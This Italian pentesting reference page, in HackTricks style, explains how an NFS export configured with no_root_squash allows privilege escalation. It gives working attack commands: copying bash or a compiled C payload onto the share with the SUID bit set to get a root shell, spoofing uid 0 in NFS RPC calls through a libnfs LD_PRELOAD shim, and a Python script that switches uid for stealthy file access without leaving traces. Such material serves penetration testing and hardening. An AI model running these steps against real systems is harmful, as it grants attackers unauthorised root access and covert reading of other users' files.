# Privilege Escalation tramite configurazione errata NFS No Root Squash

{{#include ../../banners/hacktricks-training.md}}

## Informazioni di base sullo Squashing

NFS solitamente (specialmente in Linux) si fida dei `uid` e `gid` indicati dal client che si connette per accedere ai file (se non viene usato Kerberos). Tuttavia, sul server è possibile impostare alcune configurazioni per **modificare questo comportamento**:

- **`all_squash`**: esegue lo squash di tutti gli accessi, mappando ogni utente e gruppo su **`nobody`** (65534 unsigned / -2 signed). Pertanto, tutti sono `nobody` e nessun utente viene utilizzato.
- **`root_squash`/`no_all_squash`**: è l'impostazione predefinita su Linux ed esegue lo squash **solo degli accessi con uid 0 (root)**. Pertanto, qualsiasi `UID` e `GID` viene considerato attendibile, ma `0` viene mappato su `nobody` (quindi non è possibile alcuna impersonation di root).
- **``no_root_squash`**: se abilitata, questa configurazione non esegue lo squash nemmeno dell'utente root. Ciò significa che, se monti una directory con questa configurazione, puoi accedervi come root.

Nel file **/etc/exports**, se trovi una directory configurata con **no_root_squash**, puoi **accedervi** **come client** e **scrivere al suo interno** come se fossi l'utente **root** locale della macchina.

Per ulteriori informazioni su **NFS**, consulta:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Opzione 1 usando bash:
- **Montare quella directory** su una macchina client e, **come root, copiare** il binario **/bin/bash** nella cartella montata, assegnandogli i permessi **SUID**, quindi **eseguire dalla macchina vittima** quel binario bash.
- Nota che, per essere root all'interno della condivisione NFS, sul server deve essere configurato **`no_root_squash`**.
- Tuttavia, se non è abilitato, puoi eseguire l'escalation verso un altro utente copiando il binario nella condivisione NFS e assegnandogli il permesso SUID dell'utente verso cui vuoi eseguire l'escalation.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opzione 2 usando codice compilato in C:
- **Montare quella directory** su una macchina client e, **come root, copiare** all'interno della cartella montata il nostro payload compilato che sfrutterà il permesso SUID, assegnargli i diritti **SUID** ed **eseguire dalla macchina della vittima** quel binario (puoi trovare qui alcuni [payload SUID in C](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Stesse restrizioni di prima
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Exploit locale

> [!TIP]
> Nota che, se puoi creare un **tunnel dalla tua macchina alla macchina vittima, puoi comunque usare la versione Remote per sfruttare questa privilege escalation tramite tunneling delle porte richieste**.\
> Il seguente trucco è necessario nel caso in cui il file `/etc/exports` **indichi un IP**. In questo caso **non potrai usare** in alcun caso il **remote exploit** e dovrai **sfruttare questo trucco**.\
> Un altro requisito necessario affinché l'exploit funzioni è che **l'export all'interno di `/etc/export`** **debba utilizzare il flag `insecure`**.\
> --_Non sono sicuro che questo trucco funzioni se `/etc/export` indica un indirizzo IP_--

### Informazioni di base

Lo scenario prevede lo sfruttamento di una share NFS montata su una macchina locale, sfruttando una vulnerabilità nella specifica NFSv3 che consente al client di specificare il proprio uid/gid, permettendo potenzialmente un accesso non autorizzato. Lo sfruttamento prevede l'utilizzo di [libnfs](https://github.com/sahlberg/libnfs), una libreria che consente di falsificare le chiamate RPC NFS.<sup>[[1]](#references)</sup>

#### Compilazione della libreria

I passaggi per la compilazione della libreria potrebbero richiedere modifiche in base alla versione del kernel. In questo caso specifico, le syscall fallocate sono state commentate. Il processo di compilazione prevede i seguenti comandi:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Esecuzione dell'Exploit

L'exploit consiste nella creazione di un semplice programma C (`pwn.c`) che eleva i privilegi a root e quindi esegue una shell. Il programma viene compilato e il binario risultante (`a.out`) viene posizionato sulla share con suid root, utilizzando `ld_nfs.so` per falsificare lo uid nelle chiamate RPC:

1. **Compilare il codice dell'exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Posiziona l'exploit sulla share e modifica i suoi permessi falsificando l'uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Esegui l'exploit per ottenere privilegi root:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell per l'accesso stealth ai file

Una volta ottenuto l'accesso root, per interagire con la share NFS senza modificare la proprietà (evitando di lasciare tracce), viene utilizzato uno script Python (`nfsh.py`). Questo script adatta l'uid in modo che corrisponda a quello del file a cui si sta accedendo, consentendo di interagire con i file sulla share senza problemi di autorizzazioni:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Esegui come:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Riferimenti

- [1] [A tale of a lesser known NFS privesc](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
